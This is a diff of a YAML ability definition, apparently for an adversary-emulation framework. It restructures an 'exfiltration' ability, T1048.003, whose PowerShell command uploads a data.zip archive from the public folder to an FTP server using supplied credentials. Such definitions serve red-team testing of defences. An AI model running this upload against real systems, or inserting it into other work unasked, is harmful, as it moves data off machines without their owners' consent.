@@ -1,15 +1,14 @@
-- tactic: exfiltration
-  requirements: []
+- name: copy compressed archive to ftp server
+  description: This abilities copy a file to a FTP server
+  tactic: exfiltration
   technique_id: T1048.003
-  plugin: ''
-  buckets:
-  - exfiltration
-  privilege: ''
   technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
-  singleton: false
   executors:
-  - platform: windows
-    payloads: []
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
     command: '$SourceFile = "data.zip";
 
       $SourceDirectory = "$env:PUBLIC\";
@@ -39,14 +38,15 @@
 
       $ftp.Credentials = New-Object System.Net.NetworkCredential("$ftp_user", "$ftp_password");
 
+
       $ftp.UseBinary = $true;
 
       $ftp.UsePassive = $true;
 
-
       $content = gc -encoding Byte $FullPathFile;
 
       $ftp.ContentLength = $content.Length;
+
 
       $requestStream = $ftp.GetRequestStream();
 
@@ -56,20 +56,13 @@
       $requestStream.Close();
 
       $requestStream.Dispose();'
-    parsers: []
-    variations: []
-    build_target: null
-    uploads: []
-    code: null
-    timeout: 60
-    cleanup: []
-    additional_info: {}
-    name: psh
-    language: null
-  additional_info: {}
-  access: {}
-  name: Exfiltration of a Compressed Archive to FTP Server
-  description: Exfiltrates a compressed archive to a FTP server.
-  delete_payload: true
+    timeout: '60'
   repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
   id: ftp_archive_exfiltration
